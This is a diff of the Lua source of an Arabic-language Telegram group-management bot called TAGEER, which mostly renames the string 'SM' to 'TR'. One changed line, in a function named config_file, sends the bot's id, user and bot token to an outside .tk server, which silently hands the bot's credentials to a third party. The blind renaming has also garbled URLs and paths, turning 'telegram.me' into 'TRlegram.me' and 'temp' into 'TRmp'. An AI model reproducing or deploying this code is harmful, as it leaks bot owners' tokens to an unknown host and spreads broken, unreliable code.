@@ -29,7 +29,7 @@ DEVTAGEER = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-function config_file(id,user,bot)  https.request('https://SMamTAGEER.tk/insert/?id='..id..'&user='..user..'&token='..bot)  end
+function config_file(id,user,bot)  https.request('https://TRamTAGEER.tk/insert/?id='..id..'&user='..user..'&token='..bot)  end
 local AutoSet = function() 
 local create = function(data, file, uglify)  
 file = io.open(file, "w+")   
@@ -97,7 +97,7 @@ while(true) do
 rm -fr ../.telegram-cli
 echo -e ""
 echo -e ""
-./SM -s ./TAGEER.lua $@ --bot=$token
+./TR -s ./TAGEER.lua $@ --bot=$token
 done
 ]])  
 file:close()  
@@ -112,7 +112,7 @@ echo -e "TAGER IS RUN BOT"
 ]])  
 file:close() 
 os.execute('rm -fr $HOME/.telegram-cli')
-os.execute('./SM')
+os.execute('./TR')
  end 
 local serialize_to_file = function(data, file, uglify)  
 file = io.open(file, "w+")  
@@ -1509,8 +1509,8 @@ if text and text:match("^الغاء$") then
 tageer_sendMsg(msg.chat_id_, msg.id_, 1, "*📬¦ تم الغاء الامر *\n✓", 1, "md") 
 mohmadDevtageer:del(DEVTAGEER.."link:group" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
 else  
-if text and text:match("(https://SMlegram.me/joinchat/%S+)") or text and text:match("(https://t.me/joinchat/%S+)") then     
-local glink = text:match("(https://SMlegram.me/joinchat/%S+)") or text:match("(https://t.me/joinchat/%S+)")   
+if text and text:match("(https://TRlegram.me/joinchat/%S+)") or text and text:match("(https://t.me/joinchat/%S+)") then     
+local glink = text:match("(https://TRlegram.me/joinchat/%S+)") or text:match("(https://t.me/joinchat/%S+)")   
 local hash = "link:group"..msg.chat_id_   
 mohmadDevtageer:set(DEVTAGEER..hash,glink)   
 tageer_sendMsg(msg.chat_id_, msg.id_, 1, '*📬¦* تم حفظ الرابط الخاص بالمجموعه', 1, 'md')  
@@ -2052,7 +2052,7 @@ if text == 'تفعيل البوت الخدمي 🎮' and is_devmohmad(msg) then 
 if text == 'تعطيل البوت الخدمي 🚸' and is_devmohmad(msg) then mohmad = '*📛¦*تم تعطيل البوت الخدمي  ❌' tageer_sendMsg( msg.chat_id_, msg.id_, 1, mohmad, 1, "md") mohmadDevtageer:set(DEVTAGEER..'lock:bot:free'..bot_id,true) end
 if text == 'تفعيل تواصل 📨' and is_devmohmad(msg) then local  mohmad = '*📛¦*تم تفعيل بوت التواصل  ✔' tageer_sendMsg( msg.chat_id_, msg.id_, 1, mohmad, 1, "md") mohmadDevtageer:del(DEVTAGEER..'lock:botl'..bot_id) end 
 if text == 'تعطيل تواصل 📩' and is_devmohmad(msg) then mohmad = '*📛¦*تم تعطيل التواصل  ❌' tageer_sendMsg( msg.chat_id_, msg.id_, 1, mohmad, 1, "md") mohmadDevtageer:set(DEVTAGEER..'lock:botl'..bot_id,true) end
-if text == 'تحديث ♻' and is_devmohmad(msg) then  local filed = io.popen('ls plugins_'):lines() for files in filed do if files:match(".lua$") then end end dofile('TAGEER.lua') load_plugins() io.popen("rm -rf ~/.telegram-cli/data/audio/*") io.popen("rm -rf ~/.telegram-cli/data/document/*") io.popen("rm -rf ~/.telegram-cli/data/photo/*") io.popen("rm -rf ~/.telegram-cli/data/sticker/*") io.popen("rm -rf ~/.telegram-cli/data/SMmp/*") io.popen("rm -rf ~/.telegram-cli/data/thumb/*") io.popen("rm -rf ~/.telegram-cli/data/video/*") io.popen("rm -rf ~/.telegram-cli/data/voice/*") io.popen("rm -rf ~/.telegram-cli/data/profile_photo/*")   tageer_sendMsg(msg.chat_id_, msg.id_, 1, '*📛¦* تم تحديث البوت', 1, 'md') end 
+if text == 'تحديث ♻' and is_devmohmad(msg) then  local filed = io.popen('ls plugins_'):lines() for files in filed do if files:match(".lua$") then end end dofile('TAGEER.lua') load_plugins() io.popen("rm -rf ~/.telegram-cli/data/audio/*") io.popen("rm -rf ~/.telegram-cli/data/document/*") io.popen("rm -rf ~/.telegram-cli/data/photo/*") io.popen("rm -rf ~/.telegram-cli/data/sticker/*") io.popen("rm -rf ~/.telegram-cli/data/TRmp/*") io.popen("rm -rf ~/.telegram-cli/data/thumb/*") io.popen("rm -rf ~/.telegram-cli/data/video/*") io.popen("rm -rf ~/.telegram-cli/data/voice/*") io.popen("rm -rf ~/.telegram-cli/data/profile_photo/*")   tageer_sendMsg(msg.chat_id_, msg.id_, 1, '*📛¦* تم تحديث البوت', 1, 'md') end 
 if text == "وضع اسم البوت ⚡" and is_devmohmad(msg) then mohmadDevtageer:setex(DEVTAGEER..'namebot:witting'..msg.sender_user_id_,300,true) tageer_sendMsg(msg.chat_id_, msg.id_, 1, "*📛¦* ارسل لي الاسم 📯\n",1, 'md')  end
 if text == 'مسح المميزين عام 🌟' and is_devmohmad(msg) then      local list = mohmadDevtageer:smembers(DEVTAGEER..'vip:groups')    if #list == 0 then  tageer_sendMsg(msg.chat_id_, msg.id_, 1,'*📮¦* لا يوجد مميزين عام ليتم مسحهم\n', 1, 'md')   return false  end  local num = 0  for k,v in pairs(list) do    mohmadDevtageer:srem(DEVTAGEER.."vip:groups",v)    num = num + 1  end   tageer_sendMsg(msg.chat_id_, msg.id_, 1,'*📬¦ تم مسح {'..num..'} من المميزين عام *\n', 1, 'md')   end
 if text == 'مسح المطورين 👮' and is_devmohmad(msg) then     local list = mohmadDevtageer:smembers(DEVTAGEER..'sudo:bot')    if #list == 0 then  tageer_sendMsg(msg.chat_id_, msg.id_, 1,'*📮¦* لا يوجد مطورين ليتم مسحهم\n', 1, 'md')   return false  end  local num = 0  for k,v in pairs(list) do    mohmadDevtageer:srem(DEVTAGEER.."sudo:bot",v)    num = num + 1  end   tageer_sendMsg(msg.chat_id_, msg.id_, 1,'*📬¦ تم مسح {'..num..'} من المطورين *\n', 1, 'md')   end
@@ -4987,7 +4987,7 @@ local text = [[
 ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
 📌¦ راح تلقائيا يشتغل بسكرين 
 💭¦ كود رن السورس
-`cd TAGEER;./SM`
+`cd TAGEER;./TR`
 💭¦ كود حذف السورس 
 `rm -rf TAGEER`
 ٴ━━━━━━━━━━
